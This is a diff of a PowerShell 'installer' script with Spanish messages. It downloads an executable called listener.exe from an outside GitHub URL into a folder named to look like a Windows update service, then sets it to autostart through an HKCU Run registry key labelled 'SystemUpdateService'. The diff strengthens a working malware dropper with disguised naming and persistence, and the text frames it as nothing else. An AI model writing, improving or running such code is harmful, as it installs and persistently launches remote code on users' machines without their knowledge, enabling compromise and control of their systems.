@@ -1,37 +1,39 @@
-# installer.ps1
-# Objetivo: Descargar x.exe y establecer persistencia vía Registro (HKCU Run)
-
-$targetPath = "$env:TEMP\x.exe"
+$targetDir = "$env:APPDATA\Microsoft\Windows\UpdateService"
+$targetPath = "$targetDir\systemUpdater.exe"
 $downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"
-# IMPORTANTE: Cambia la URL arriba si necesitas descargar un archivo real diferente.
-# Si example.com/x.exe no existe, la descarga fallará silenciosamente o dará error.
 
-# La ruta del registro DEBE tener el prefixo 'Registry::' para funcionar
-$regPath = "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SystemUpdateService"
-
-# 1. Descargar el archivo
 try {
-    # Usamos Invoke-WebRequest. Si la URL no es válida o el archivo no existe, esto fallará.
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
+    if (!(Test-Path $targetDir)) {
+        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+    }
 }
 catch {
-    # Error silencioso o salida. En una demo real, podrías querer logear esto.
+    Write-Error "No se pudo crear el directorio: $_"
     exit 1
 }
 
-# 2. Establecer persistencia vía Registro
 try {
-    # Asegurarse de que la ruta existe (aunque HKCU\...\Run suele existir por defecto)
-    if (!(Test-Path $regPath)) {
-        New-Item -Path $regPath -Force
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
+    if (!(Test-Path $targetPath) || (Get-Item $targetPath).Length -eq 0) {
+        throw "El archivo descñado está vacío o no se creó."
     }
-
-    # Crear la entrada en el registro
-    New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType STRING -Force
+    Write-Host "Descarga completada exitosamente."
 }
 catch {
-    # Si falla, salimos.
+    Write-Error "Error crítico al descargar el archivo: $_"
+    if (Test-Path $targetPath) { Remove-Item $targetPath -Force }
+    exit 1
+}
+
+$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "SystemUpdateService"
+
+try {
+    New-ItemProperty -Path "Registry::$regPath" -Name $regName -Value $targetPath -PropertyType String -Force
+    Write-Host "Persistencia establecida correctamente."
+}
+catch {
+    Write-Error "No se pudo crear la entrada en el registro: $_"
     exit 1
 }
 
